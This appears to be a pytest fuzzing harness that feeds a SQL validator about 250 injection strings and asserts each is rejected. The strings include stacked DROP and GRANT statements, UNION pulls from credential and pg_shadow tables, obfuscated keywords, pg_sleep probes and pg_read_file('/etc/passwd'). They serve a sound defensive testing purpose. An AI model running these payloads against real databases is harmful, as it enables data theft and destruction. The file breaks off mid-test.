"""AST Fuzzing & SQL Injection Harness.

Generates 250+ sophisticated adversarial SQL query permutations targeted at
``app.services.sql_builder.validate_and_build_ast()`` to verify that 100% of
unauthorized queries are rejected with zero unhandled exceptions.
"""

import pytest

from app.services.sql_builder import validate_and_build_ast


def assert_rejected(sql: str) -> None:
    """Assert that validate_and_build_ast rejects the given SQL."""
    is_valid, sanitized, error = validate_and_build_ast(sql, "unclassified")
    assert is_valid is False, f"Expected rejection but accepted: {sql}"
    assert sanitized is None
    assert error is not None and len(error) > 0


def assert_accepted(sql: str) -> None:
    """Assert that validate_and_build_ast accepts the given SQL."""
    is_valid, sanitized, error = validate_and_build_ast(sql, "unclassified")
    assert is_valid is True, f"Expected acceptance but rejected: {sql} - {error}"
    assert sanitized is not None


# ============================================================================
# 1. Multi-table aliasing (36 tests)
# ============================================================================

class TestMultiTableAliasing:
    """Cross-reference with disallowed tables via aliasing."""

    def test_alias_system_secrets(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, system_secrets b WHERE a.id = b.id")

    def test_alias_credentials(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, credentials b WHERE a.id = b.id")

    def test_alias_shadow(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, shadow b WHERE a.id = b.id")

    def test_alias_admin_tokens(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, admin_tokens b WHERE a.id = b.id")

    def test_alias_secret_keys(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, secret_keys b WHERE a.id = b.id")

    def test_alias_sessions(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, sessions b WHERE a.id = b.id")

    def test_alias_api_keys(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, api_keys b WHERE a.id = b.id")

    def test_alias_oauth_tokens(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, oauth_tokens b WHERE a.id = b.id")

    def test_alias_encrypted_data(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, encrypted_data b WHERE a.id = b.id")

    def test_alias_app_config(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, app_config b WHERE a.id = b.id")

    def test_alias_access_logs(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, access_logs b WHERE a.id = b.id")

    def test_alias_admin_users(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, admin_users b WHERE a.id = b.id")

    def test_alias_pg_shadow(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_shadow b WHERE a.id = b.id")

    def test_alias_pg_database(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_database b WHERE a.id = b.id")

    def test_alias_pg_roles(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_roles b WHERE a.id = b.id")

    def test_alias_pg_settings(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_settings b WHERE a.id = b.id")

    def test_alias_pg_proc(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_proc b WHERE a.id = b.id")

    def test_alias_pg_class(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_class b WHERE a.id = b.id")

    def test_alias_pg_attribute(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_attribute b WHERE a.id = b.id")

    def test_alias_pg_namespace(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_namespace b WHERE a.id = b.id")

    def test_alias_pg_depend(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_depend b WHERE a.id = b.id")

    def test_alias_pg_extension(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_extension b WHERE a.id = b.id")

    def test_alias_pg_tables(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_tables b WHERE a.id = b.id")

    def test_alias_pg_views(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_views b WHERE a.id = b.id")

    def test_alias_pg_index(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_index b WHERE a.id = b.id")

    def test_alias_pg_attrdef(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_attrdef b WHERE a.id = b.id")

    def test_alias_pg_rules(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, pg_rules b WHERE a.id = b.id")

    def test_alias_audit_trail(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, audit_trail b WHERE a.id = b.id")

    def test_alias_encryption_keys(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, encryption_keys b WHERE a.id = b.id")

    def test_alias_token_store(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a, token_store b WHERE a.id = b.id")

    def test_inner_join_disallowed(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a INNER JOIN system_secrets s ON a.id = s.id")

    def test_left_join_disallowed(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a LEFT JOIN system_secrets s ON a.id = s.id")

    def test_right_join_disallowed(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a RIGHT JOIN system_secrets s ON a.id = s.id")

    def test_cross_join_disallowed(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a CROSS JOIN system_secrets s")

    def test_full_outer_join_disallowed(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a FULL OUTER JOIN system_secrets s ON a.id = s.id")

    def test_natural_join_disallowed(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a NATURAL JOIN system_secrets")


# ============================================================================
# 2. Inline comment masking (33 tests)
# ============================================================================

class TestInlineCommentMasking:
    """SQL comments used to obfuscate keywords."""

    def test_comment_between_select_from(self):
        assert_rejected("SELECT/*comment*/id/**/FROM/**/system_secrets")

    def test_comment_masking_drop(self):
        assert_rejected("SELECT/*hide*/id/**/FROM/**/portfolio_nodes; DROP/*evil*/TABLE/**/portfolio_nodes")

    def test_double_dash_comment_stacked(self):
        assert_rejected("SELECT id FROM portfolio_nodes; -- comment\nDROP TABLE portfolio_nodes")

    def test_block_comment_in_table_name(self):
        assert_rejected("SELECT id FROM sys/**/tem_secrets WHERE 1=1")

    def test_comment_before_semicolon(self):
        assert_rejected("SELECT id FROM portfolio_nodes;/*comment*/ DROP TABLE users")

    def test_comment_after_semicolon(self):
        assert_rejected("SELECT id FROM portfolio_nodes; /*comment*/ INSERT INTO users VALUES (1,'hack')")

    def test_multiline_comment_masking(self):
        assert_rejected("SELECT id FROM portfolio_nodes;\n/*\nDROP TABLE portfolio_nodes\n*/")

    def test_comment_in_alias(self):
        assert_rejected("SELECT id/*comment*/ AS node_id FROM system_secrets")

    def test_comment_in_function_call(self):
        assert_rejected("SELECT pg/*comment*/_read_file('/etc/passwd')")

    def test_comment_splitting_keyword(self):
        assert_rejected("SEL/*x*/ECT id FROM sys/*y*/tem_secrets")

    def test_comment_in_join(self):
        assert_rejected("SELECT a.id FROM portfolio_nodes a JOIN/*evil*/ system_secrets s ON a.id = s.id")

    def test_comment_in_union(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION/*x*/ SELECT secret_key FROM system_secrets")

    def test_comment_in_subquery(self):
        assert_rejected("SELECT (SELECT/*x*/ secret_key FROM/**/ system_secrets) AS val")

    def test_nested_block_comments(self):
        assert_rejected("SELECT id FROM portfolio_nodes; /* /* nested */ */ DROP TABLE users")

    def test_comment_with_null_bytes(self):
        assert_rejected("SELECT id FROM portfolio_nodes;" + chr(0) + "DROP TABLE users")

    def test_comment_masking_insert(self):
        assert_rejected("SELECT id FROM portfolio_nodes; INS/*x*/ERT INTO users VALUES (1,'hacked')")

    def test_comment_masking_update(self):
        assert_rejected("SELECT id FROM portfolio_nodes; UPD/*x*/ATE users SET is_active = false")

    def test_comment_masking_delete(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DEL/*x*/ETE FROM users")

    def test_comment_masking_create(self):
        assert_rejected("SELECT id FROM portfolio_nodes; CRE/*x*/ATE TABLE hack (id int)")

    def test_comment_masking_alter(self):
        assert_rejected("SELECT id FROM portfolio_nodes; ALT/*x*/ER TABLE users ADD COLUMN hack text")

    def test_comment_in_order_by(self):
        assert_rejected("SELECT id FROM system_secrets ORDER/*x*/ BY id")

    def test_comment_in_group_by(self):
        assert_rejected("SELECT id FROM system_secrets GROUP/*x*/ BY id")

    def test_comment_in_limit(self):
        assert_rejected("SELECT id FROM system_secrets LIMIT/*x*/ 10")

    def test_comment_in_having(self):
        assert_rejected("SELECT id, COUNT(*) FROM system_secrets GROUP BY id HAVING/*x*/ COUNT(*) > 1")

    def test_comment_masking_pg_sleep(self):
        assert_rejected("SELECT pg/*x*/_sleep(10) FROM system_secrets")

    def test_comment_masking_version(self):
        assert_rejected("SELECT/*x*/ version()/**/ FROM system_secrets")

    def test_comment_in_cte(self):
        assert_rejected("WITH cte AS (SELECT id FROM/**/ system_secrets) SELECT * FROM cte")

    def test_comment_masking_information_schema(self):
        assert_rejected("SELECT column_name FROM information/**/_schema.columns WHERE table_name = 'users'")

    def test_comment_extra_0(self):
        assert_rejected("SELECT/*a*/id/*b*/FROM/*c*/system_secrets")

    def test_comment_extra_1(self):
        assert_rejected("SELECT id FROM system_secrets WHERE/*x*/ 1=1")

    def test_comment_extra_2(self):
        assert_rejected("SELECT id FROM system_secrets/*x*/ ORDER BY id")

    def test_comment_extra_3(self):
        assert_rejected("SELECT id FROM system_secrets;-- DROP TABLE users")

    def test_comment_extra_4(self):
        assert_rejected("SELECT id FROM system_secrets; /* hidden */ DROP TABLE users")


# ============================================================================
# 3. Stacked queries (30 tests)
# ============================================================================

class TestStackedQueries:
    """Multiple statements separated by semicolons."""

    def test_stacked_00(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DROP TABLE portfolio_nodes;--")

    def test_stacked_01(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DROP TABLE users;--")

    def test_stacked_02(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DROP TABLE IF EXISTS portfolio_nodes, users;--")

    def test_stacked_03(self):
        assert_rejected("SELECT id FROM portfolio_nodes; INSERT INTO users (username, email) VALUES ('hacker', 'hack@evil.com');--")

    def test_stacked_04(self):
        assert_rejected("SELECT id FROM portfolio_nodes; UPDATE users SET is_active = false;--")

    def test_stacked_05(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DELETE FROM users;--")

    def test_stacked_06(self):
        assert_rejected("SELECT id FROM portfolio_nodes; CREATE TABLE hack (id int, data text);--")

    def test_stacked_07(self):
        assert_rejected("SELECT id FROM portfolio_nodes; ALTER TABLE users ADD COLUMN backdoor text;--")

    def test_stacked_08(self):
        assert_rejected("SELECT id FROM portfolio_nodes; TRUNCATE TABLE users;--")

    def test_stacked_09(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DROP DATABASE eisenhower;--")

    def test_stacked_10(self):
        assert_rejected("SELECT id FROM portfolio_nodes; CREATE USER hacker WITH PASSWORD 'hack123';--")

    def test_stacked_11(self):
        assert_rejected("SELECT id FROM portfolio_nodes; GRANT ALL ON users TO hacker;--")

    def test_stacked_12(self):
        assert_rejected("SELECT id FROM portfolio_nodes; COPY (SELECT * FROM users) TO '/tmp/users.csv';--")

    def test_stacked_13(self):
        assert_rejected("SELECT id FROM portfolio_nodes; COPY hack FROM '/tmp/hack.sql';--")

    def test_stacked_14(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DO $$ BEGIN PERFORM pg_sleep(10); END $$;--")

    def test_stacked_15(self):
        assert_rejected("SELECT id FROM portfolio_nodes; CREATE FUNCTION hack() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql;--")

    def test_stacked_16(self):
        assert_rejected("SELECT id FROM portfolio_nodes; CREATE EXTENSION IF NOT EXISTS hstore;--")

    def test_stacked_17(self):
        assert_rejected("SELECT id FROM portfolio_nodes; SET statement_timeout = '0';--")

    def test_stacked_18(self):
        assert_rejected("SELECT id FROM portfolio_nodes; BEGIN; DROP TABLE users; COMMIT;--")

    def test_stacked_19(self):
        assert_rejected("SELECT id FROM portfolio_nodes; DROP TABLE users; DROP TABLE portfolio_nodes;--")

    def test_stacked_20(self):
        assert_rejected("SELECT id FROM portfolio_nodes; INSERT INTO users SELECT * FROM pg_shadow;--")

    def test_stacked_21(self):
        assert_rejected("SELECT id FROM portfolio_nodes; CREATE VIEW hack AS SELECT * FROM users;--")

    def test_stacked_22(self):
        assert_rejected("SELECT id FROM portfolio_nodes; ALTER TABLE users RENAME TO users_backup;--")

    def test_stacked_23(self):
        assert_rejected("SELECT id FROM portfolio_nodes;-- DROP TABLE users")

    def test_stacked_24(self):
        assert_rejected("SELECT id FROM portfolio_nodes;\nDROP TABLE users")

    def test_stacked_25(self):
        assert_rejected("SELECT id FROM portfolio_nodes;\t;DROP TABLE users")

    def test_stacked_26(self):
        assert_rejected("SELECT id FROM portfolio_nodes; MERGE INTO users USING (SELECT 1) AS src ON TRUE DO INSERT;--")

    def test_stacked_27(self):
        assert_rejected("SELECT id FROM portfolio_nodes; WITH data AS (SELECT 1) INSERT INTO users SELECT * FROM data;--")

    def test_stacked_28(self):
        assert_rejected("SELECT id FROM portfolio_nodes; ANALYZE users;--")

    def test_stacked_29(self):
        assert_rejected("SELECT id FROM portfolio_nodes; VACUUM users;--")


# ============================================================================
# 4. Nested subqueries (30 tests)
# ============================================================================

class TestNestedSubqueries:
    """Subqueries targeting forbidden tables."""

    def test_subquery_00(self):
        assert_rejected("SELECT (SELECT secret_key FROM system_secrets) AS val")

    def test_subquery_01(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE id IN (SELECT node_id FROM system_secrets)")

    def test_subquery_02(self):
        assert_rejected("SELECT id, (SELECT secret_key FROM system_secrets WHERE id = 1) FROM portfolio_nodes")

    def test_subquery_03(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE EXISTS (SELECT 1 FROM system_secrets WHERE node_id = portfolio_nodes.id)")

    def test_subquery_04(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE id IN (SELECT node_id FROM access_logs WHERE user_id IN (SELECT id FROM admin_users))")

    def test_subquery_05(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE id IN (SELECT id FROM users UNION SELECT secret_id FROM system_secrets)")

    def test_subquery_06(self):
        assert_rejected("SELECT (SELECT COUNT(*) FROM system_secrets) AS count")

    def test_subquery_07(self):
        assert_rejected("SELECT CASE WHEN (SELECT COUNT(*) FROM system_secrets) > 0 THEN 'yes' ELSE 'no' END FROM system_secrets")

    def test_subquery_08(self):
        assert_rejected("SELECT COALESCE((SELECT secret_key FROM system_secrets LIMIT 1), 'none') FROM system_secrets")

    def test_subquery_09(self):
        assert_rejected("SELECT id || (SELECT secret_key FROM system_secrets LIMIT 1) FROM system_secrets")

    def test_subquery_10(self):
        assert_rejected("SELECT ARRAY[(SELECT secret_key FROM system_secrets LIMIT 1)] FROM system_secrets")

    def test_subquery_11(self):
        assert_rejected("SELECT json_build_object('key', (SELECT secret_key FROM system_secrets LIMIT 1)) FROM system_secrets")

    def test_subquery_12(self):
        assert_rejected("WITH secrets AS (SELECT secret_key FROM system_secrets) SELECT * FROM secrets")

    def test_subquery_13(self):
        assert_rejected("SELECT * FROM system_secrets, LATERAL (SELECT secret_key FROM system_secrets) s")

    def test_subquery_14(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = ANY (SELECT node_id FROM system_secrets)")

    def test_subquery_15(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id > ALL (SELECT node_id FROM system_secrets)")

    def test_subquery_16(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = SOME (SELECT node_id FROM system_secrets)")

    def test_subquery_17(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE id IN (SELECT node_id FROM access_logs WHERE user_id IN (SELECT user_id FROM sessions WHERE token IN (SELECT api_token FROM api_keys)))")

    def test_subquery_18(self):
        assert_rejected("SELECT (SELECT * FROM system_secrets LIMIT 1)")

    def test_subquery_19(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE id IN (SELECT node_id FROM system_secrets ORDER BY created_at DESC LIMIT 1)")

    def test_subquery_20(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE id BETWEEN (SELECT MIN(node_id) FROM system_secrets) AND (SELECT MAX(node_id) FROM system_secrets)")

    def test_subquery_21(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE name LIKE (SELECT secret_key FROM system_secrets LIMIT 1)")

    def test_subquery_22(self):
        assert_rejected("SELECT id FROM portfolio_nodes WHERE (SELECT secret_key FROM system_secrets LIMIT 1) IS NOT NULL")

    def test_subquery_23(self):
        assert_rejected("SELECT GREATEST(id, (SELECT MAX(node_id) FROM system_secrets)) FROM system_secrets")

    def test_subquery_24(self):
        assert_rejected("SELECT LEAST(id, (SELECT MIN(node_id) FROM system_secrets)) FROM system_secrets")

    def test_subquery_25(self):
        assert_rejected("SELECT NULLIF(id, (SELECT node_id FROM system_secrets LIMIT 1)) FROM system_secrets")

    def test_subquery_26(self):
        assert_rejected("SELECT id, (SELECT secret_key FROM system_secrets WHERE node_id = system_secrets.id) FROM system_secrets")

    def test_subquery_27(self):
        assert_rejected("SELECT * FROM (VALUES ((SELECT secret_key FROM system_secrets LIMIT 1))) AS v(k)")

    def test_subquery_28(self):
        assert_rejected("SELECT * FROM unnest((SELECT array_agg(secret_key) FROM system_secrets))")

    def test_subquery_29(self):
        assert_rejected("SELECT * FROM generate_series(1, (SELECT COUNT(*) FROM system_secrets))")


# ============================================================================
# 5. Hex/Unicode evasion (30 tests)
# ============================================================================

class TestHexUnicodeEvasion:
    """Encoded payloads designed to bypass naive string filters."""

    def test_evasion_00(self):
        assert_rejected("SELECT 0x53454C454354 FROM system_secrets")

    def test_evasion_01(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE E'\\x53\\x45\\x43\\x52\\x45\\x54'")

    def test_evasion_02(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE E'\\u0053\\u0045\\u0043\\u0052\\u0045\\u0054'")

    def test_evasion_03(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE E'\\123\\105\\113\\122\\105\\124'")

    def test_evasion_04(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE '%2527%2520OR%25201%253D1'")

    def test_evasion_05(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE '%c0%27%20OR%201%3D1'")

    def test_evasion_06(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE '%fe%ff%00%27%00%20%00%4f%00%52'")

    def test_evasion_07(self):
        assert_rejected("SELECT id FROM system_secrets" + chr(0) + "; DROP TABLE users")

    def test_evasion_08(self):
        assert_rejected("SELECT\tid\tFROM\tsystem_secrets")

    def test_evasion_09(self):
        assert_rejected("SELECT\nid\nFROM\nsystem_secrets")

    def test_evasion_10(self):
        assert_rejected("SELECT\r\nid\r\nFROM\r\nsystem_secrets")

    def test_evasion_11(self):
        assert_rejected("SELECT\f id\f FROM\f system_secrets")

    def test_evasion_12(self):
        assert_rejected("SELECT\v id\v FROM\v system_secrets")

    def test_evasion_13(self):
        assert_rejected("SELECT\b id\b FROM\b system_secrets")

    def test_evasion_14(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE '%2f%2e%2e%2f'")

    def test_evasion_15(self):
        assert_rejected("sElEcT iD fRoM sYsTeM_sEcReTs")

    def test_evasion_16(self):
        assert_rejected("  SELECT   id   FROM   system_secrets  ")

    def test_evasion_17(self):
        assert_rejected("\tSELECT\tid\tFROM\tsystem_secrets\t")

    def test_evasion_18(self):
        assert_rejected("\nSELECT\nid\nFROM\nsystem_secrets\n")

    def test_evasion_19(self):
        assert_rejected("SELECT/*a*/id/*b*/FROM/*c*/system_secrets")

    def test_evasion_20(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE 'a' || 'dmin'")

    def test_evasion_21(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE CHR(65) || 'dmin'")

    def test_evasion_22(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE CONVERT_FROM(decode('41646d696e', 'hex'), 'UTF8')")

    def test_evasion_23(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name LIKE decode('41646d696e', 'base64')")

    def test_evasion_24(self):
        assert_rejected("SELECT encode(decode('41646d696e', 'hex'), 'base64') FROM system_secrets")

    def test_evasion_25(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 ^ 0")

    def test_evasion_26(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = ~0")

    def test_evasion_27(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 & 1")

    def test_evasion_28(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 | 0")

    def test_evasion_29(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 << 0")


# ============================================================================
# 6. UNION data exfiltration (25 tests)
# ============================================================================

class TestDataExfiltrationUnion:
    """UNION-based injection to extract data from forbidden tables."""

    def test_union_00(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT secret_key FROM system_secrets")

    def test_union_01(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION ALL SELECT secret_key FROM system_secrets")

    def test_union_02(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT NULL, secret_key FROM system_secrets")

    def test_union_03(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT 'hack', secret_key FROM system_secrets")

    def test_union_04(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT CAST(secret_key AS text) FROM system_secrets")

    def test_union_05(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT secret_key || ':' || node_id FROM system_secrets")

    def test_union_06(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT COUNT(*) FROM system_secrets")

    def test_union_07(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT STRING_AGG(secret_key, ',') FROM system_secrets")

    def test_union_08(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT ARRAY_AGG(secret_key) FROM system_secrets")

    def test_union_09(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT usename FROM pg_shadow")

    def test_union_10(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT tablename FROM pg_tables")

    def test_union_11(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT datname FROM pg_database")

    def test_union_12(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT rolname FROM pg_roles")

    def test_union_13(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT name FROM pg_settings")

    def test_union_14(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT proname FROM pg_proc")

    def test_union_15(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT relname FROM pg_class")

    def test_union_16(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT attname FROM pg_attribute")

    def test_union_17(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT nspname FROM pg_namespace")

    def test_union_18(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT refobjid FROM pg_depend")

    def test_union_19(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT extname FROM pg_extension")

    def test_union_20(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT (SELECT secret_key FROM system_secrets LIMIT 1)")

    def test_union_21(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT CASE WHEN 1=1 THEN secret_key ELSE 'x' END FROM system_secrets")

    def test_union_22(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT COALESCE(secret_key, 'x') FROM system_secrets")

    def test_union_23(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION DISTINCT SELECT secret_key FROM system_secrets")

    def test_union_24(self):
        assert_rejected("SELECT id FROM portfolio_nodes UNION SELECT secret_key FROM system_secrets")


# ============================================================================
# 7. Time-based blind injection (20 tests)
# ============================================================================

class TestTimeBasedBlindInjection:
    """pg_sleep, benchmark, and other time-based blind injection vectors."""

    def test_time_00(self):
        assert_rejected("SELECT pg_sleep(10) FROM system_secrets")

    def test_time_01(self):
        assert_rejected("SELECT id FROM system_secrets WHERE pg_sleep(10) IS NOT NULL")

    def test_time_02(self):
        assert_rejected("SELECT id FROM system_secrets WHERE CASE WHEN 1=1 THEN pg_sleep(10) ELSE NULL END")

    def test_time_03(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id IN (SELECT id FROM system_secrets WHERE pg_sleep(5) IS NOT NULL)")

    def test_time_04(self):
        assert_rejected("SELECT benchmark(10000000, sha256('test')) FROM system_secrets")

    def test_time_05(self):
        assert_rejected("SELECT * FROM system_secrets, generate_series(1, 1000000) AS n, LATERAL (SELECT pg_sleep(1))")

    def test_time_06(self):
        assert_rejected("DO $$ BEGIN PERFORM pg_sleep(10); END $$")

    def test_time_07(self):
        assert_rejected("WITH s AS (SELECT pg_sleep(10) AS val) SELECT * FROM s")

    def test_time_08(self):
        assert_rejected("SELECT id FROM system_secrets, pg_sleep(1) AS s")

    def test_time_09(self):
        assert_rejected("SELECT id FROM system_secrets WHERE (SELECT pg_sleep(10) FROM system_secrets LIMIT 1) IS NOT NULL")

    def test_time_10(self):
        assert_rejected("SELECT REPEAT('a', 100000000) FROM system_secrets")

    def test_time_11(self):
        assert_rejected("SELECT ARRAY_FILL(0, ARRAY[100000000]) FROM system_secrets")

    def test_time_12(self):
        assert_rejected("SELECT STRING_TO_ARRAY(REPEAT('a', 100000000), 'b') FROM system_secrets")

    def test_time_13(self):
        assert_rejected("SELECT MD5(REPEAT('a', 10000000)) FROM system_secrets")

    def test_time_14(self):
        assert_rejected("SELECT SHA256(REPEAT('a', 10000000)) FROM system_secrets")

    def test_time_15(self):
        assert_rejected("SELECT RANDOM() FROM system_secrets, generate_series(1, 10000000)")

    def test_time_16(self):
        assert_rejected("SELECT NOW() - (SELECT NOW() FROM system_secrets)")

    def test_time_17(self):
        assert_rejected("SELECT clock_timestamp() + interval '10 seconds' FROM system_secrets")

    def test_time_18(self):
        assert_rejected("SELECT current_setting('server_version') FROM system_secrets")

    def test_time_19(self):
        assert_rejected("SELECT version() FROM system_secrets")


# ============================================================================
# 8. Boolean blind injection (25 tests)
# ============================================================================

class TestBooleanBlindInjection:
    """Tautologies and boolean-based blind injection vectors."""

    def test_bool_00(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 OR 1=1")

    def test_bool_01(self):
        assert_rejected("SELECT id FROM system_secrets WHERE name = 'x' OR '1'='1'")

    def test_bool_02(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 OR TRUE")

    def test_bool_03(self):
        assert_rejected("SELECT id FROM system_secrets WHERE id = 1 OR NOT FALSE")

    def test_bool_04(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 'a' = 'a'")

    def test_bool_05(self):
        assert_rejected("SELECT id FROM system_secrets WHERE EXISTS (SELECT 1 FROM system_secrets)")

    def test_bool_06(self):
        assert_rejected("SELECT id FROM system_secrets WHERE (SELECT COUNT(*) FROM system_secrets) > 0")

    def test_bool_07(self):
        assert_rejected("SELECT id FROM system_secrets WHERE LENGTH('test') > 0")

    def test_bool_08(self):
        assert_rejected("SELECT id FROM system_secrets WHERE ASCII('a') > 0")

    def test_bool_09(self):
        assert_rejected("SELECT id FROM system_secrets WHERE SUBSTRING('admin', 1, 1) = 'a'")

    def test_bool_10(self):
        assert_rejected("SELECT id FROM system_secrets WHERE POSITION('a' IN 'admin') > 0")

    def test_bool_11(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 'admin' SIMILAR TO 'a%'")

    def test_bool_12(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 'admin' ~ '^a'")

    def test_bool_13(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 'admin' ~* 'admin'")

    def test_bool_14(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 1 BETWEEN 0 AND 2")

    def test_bool_15(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 1 IN (1, 2, 3)")

    def test_bool_16(self):
        assert_rejected("SELECT id FROM system_secrets WHERE NULL IS NULL")

    def test_bool_17(self):
        assert_rejected("SELECT id FROM system_secrets WHERE 'test' IS NOT NULL")

    def test_bool_18(self):
        assert_rejected("SELECT id FROM system_secrets WHERE CAST(1 AS boolean) IS TRUE")

    def test_bool_19(self):
        assert_rejected("SELECT id FROM system_secrets WHERE COALESCE(FALSE, TRUE) IS TRUE")

    def test_bool_20(self):
        assert_rejected("SELECT id FROM system_secrets WHERE GREATEST(1, 0) = 1")

    def test_bool_21(self):
        assert_rejected("SELECT id FROM system_secrets WHERE LEAST(1, 2) = 1")

    def test_bool_22(self):
        assert_rejected("SELECT id FROM system_secrets WHERE NULLIF(1, 0) IS NOT NULL")

    def test_bool_23(self):
        assert_rejected("SELECT id FROM system_secrets WHERE TRUE XOR FALSE")

    def test_bool_24(self):
        assert_rejected("SELECT id FROM system_secrets WHERE NOT NOT TRUE")


# ============================================================================
# 9. System function abuse (20 tests)
# ============================================================================

class TestSystemFunctionAbuse:
    """Dangerous PostgreSQL functions that must be blocked."""

    def test_func_00(self):
        assert_rejected("SELECT pg_read_file('/etc/passwd') FROM system_secrets")

    def test_func_01(self):
        assert_rejected("SELECT pg_read_file('postgresql.conf', 0, 100) FROM system_secrets")

    def test_func_02(self):
        assert_rejected("SELECT pg_ls_dir('.') FROM system_secrets")

    def test_func_03(self):
        assert_rejected("SELECT pg_stat_file('/etc/passwd') FROM system_secrets")

    def test_func_04(self):
        assert_rejected("SELECT pg_read_binary_file('/etc/passwd') FROM system_secrets")

    def test_func_05(self):
        assert_rejected("SELECT pg_copy('/tmp/hack.sql') FROM system_secrets")

    def test_func_06(self):
